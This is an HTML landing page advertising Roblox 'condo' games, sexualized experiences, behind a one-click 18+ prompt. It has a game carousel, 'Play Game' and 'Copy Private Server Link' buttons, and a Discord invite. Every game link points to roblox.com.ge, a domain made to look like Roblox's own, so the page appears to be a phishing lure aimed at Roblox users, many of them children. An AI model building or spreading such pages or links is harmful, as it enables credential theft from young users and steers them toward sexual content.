<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ROBLOX CONDO GAMES</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Poppins', sans-serif; overflow: hidden; }
        .app-container { position: relative; width: 100vw; height: 100vh; overflow: hidden; }
        .animated-bg { position: fixed; inset: 0; background: linear-gradient(-45deg, #7c3aed, #2563eb, #06b6d4, #8b5cf6); background-size: 400% 400%; animation: gradientShift 15s ease infinite; z-index: 0;}
        @keyframes gradientShift {0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
        .modal-overlay { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 50; }
        .modal-content { background: rgba(20,20,20,.95); border-radius: 24px; padding: 48px 64px; text-align: center; }
        .modal-title { font-size: 36px; font-weight: 800; color: #fff; margin-bottom: 16px; }
        .modal-text { color: rgba(255,255,255,.8); margin-bottom: 32px; }
        .modal-buttons { display: flex; gap: 16px; justify-content: center; }
        .btn-yes,.btn-no,.btn-join,.btn-server,.btn-nav,.btn-discord {
            cursor: pointer; border: none; border-radius: 12px; font-weight: 700;
        }
        .btn-yes { background: linear-gradient(135deg,#84cc16,#eab308); padding:14px 32px; }
        .btn-no { background: linear-gradient(135deg,#ef4444,#f97316); padding:14px 32px; color:#fff; }
        .game-carousel-container { display: none; z-index: 10; height: 100vh; align-items: center; justify-content: center; flex-direction: column; }
        .game-carousel-container.show { display: flex; }
        .carousel-title { font-size: 48px; font-weight: 800; margin-bottom: 24px; background: linear-gradient(135deg,#06b6d4,#a3e635); -webkit-background-clip:text; color:transparent; }
        .game-card { background: rgba(30,41,59,.85); padding: 48px 64px; border-radius: 24px; text-align: center; }
        .card-title { font-size: 32px; font-weight: 800; color: #a3e635; margin-bottom: 32px; }
        .card-buttons { display: flex; gap: 16px; justify-content: center; }
        .btn-join { background: linear-gradient(135deg,#22c55e,#16a34a); padding:14px 28px; color:#fff; }
        .btn-server { background:#334155; padding:14px 28px; color:#fff; }
        .btn-nav { background: linear-gradient(135deg,#a855f7,#ec4899); padding:12px 32px; color:#fff; }
        .btn-discord { margin-top:24px; background: linear-gradient(135deg,#5865F2,#4f46e5); padding:16px 48px; color:#fff; }
        #loadingOverlay { position:fixed; inset:0; display:none; align-items:center; justify-content:center; font-size:24px; font-weight:700; background:rgba(0,0,0,.7); color:#fff; z-index:100; }
    </style>
</head>

<body>
<div class="app-container">
    <div class="animated-bg"></div>
    <div id="loadingOverlay">Copying...</div>

    <!-- AGE MODAL -->
    <div class="modal-overlay" id="ageModal">
        <div class="modal-content">
            <h1 class="modal-title">Are you 18+?</h1>
            <p class="modal-text">Please confirm your age to continue.</p>
            <div class="modal-buttons">
                <button class="btn-yes" onclick="handleEnter()">Yes</button>
                <button class="btn-no" onclick="handleLeave()">No</button>
            </div>
        </div>
    </div>

    <!-- MAIN -->
    <div class="game-carousel-container" id="mainContent">
        <h1 class="carousel-title">ROBLOX GAME LIST</h1>

        <button class="btn-nav" onclick="handlePrev()">Prev</button>

        <div class="game-card">
            <h2 class="card-title" id="gameTitle"></h2>
            <div class="card-buttons">
                <button class="btn-join" onclick="handleJoin()">Play Game</button>
                <button class="btn-server" onclick="handleServer()">Copy Private Server Link</button>
            </div>
        </div>

        <button class="btn-nav" onclick="handleNext()">Next</button>

        <button class="btn-discord" onclick="handleDiscord()">Join Discord</button>
    </div>
</div>

<script>
const games = [
    {
        title: 'Sussy Neko Obby',
        joinLink: 'https://roblox.com.ge/games/131306514547473/Sussy-Neko-Obby-Hot-surprise-at-the-end?privateServerLinkCode=28651437264583999706600674391313'
    },
    {
        title: 'Rizz The AI',
        joinLink: 'https://roblox.com.ge/games/136828983070777/Rizz-The-Ai?privateServerLinkCode=28651437264583999706600674391313'
    },
    {
        title: 'Sus Gas Station Worker',
        joinLink: 'https://roblox.com.ge/games/15932212022/your-sus-gas-station-worker?privateServerLinkCode=28651437264583999706600674391313'
    },
    {
        title: 'Neko Infection (Christmas)',
        joinLink: 'https://roblox.com.ge/games/13831863192/Neko-Infection-CHRISTMAS?privateServerLinkCode=28651437264583999706600674391313'
    },
    {
        title: 'Zels Fun Combat (New Maps)',
        joinLink: 'https://roblox.com.ge/games/90118298734859/NEW-MAPS-Zels-Fun-Combat?privateServerLinkCode=28651437264583999706600674391313'
    }
];

let currentIndex = 0;

function handleEnter() {
    document.getElementById('ageModal').style.display = 'none';
    document.getElementById('mainContent').classList.add('show');
    updateGame();
}

function handleLeave() {
    location.href = 'https://google.com';
}

function handlePrev() {
    currentIndex = (currentIndex - 1 + games.length) % games.length;
    updateGame();
}

function handleNext() {
    currentIndex = (currentIndex + 1) % games.length;
    updateGame();
}

function updateGame() {
    document.getElementById('gameTitle').textContent = games[currentIndex].title;
}

function handleJoin() {
    window.open(games[currentIndex].joinLink, '_blank');
}

function handleServer() {
    navigator.clipboard.writeText(games[currentIndex].joinLink);
    const o = document.getElementById('loadingOverlay');
    o.style.display = 'flex';
    setTimeout(()=>o.style.display='none',1200);
}

function handleDiscord() {
    window.open('https://discord.gg/zQ9yVmDw7B','_blank');
}
</script>
</body>
</html>
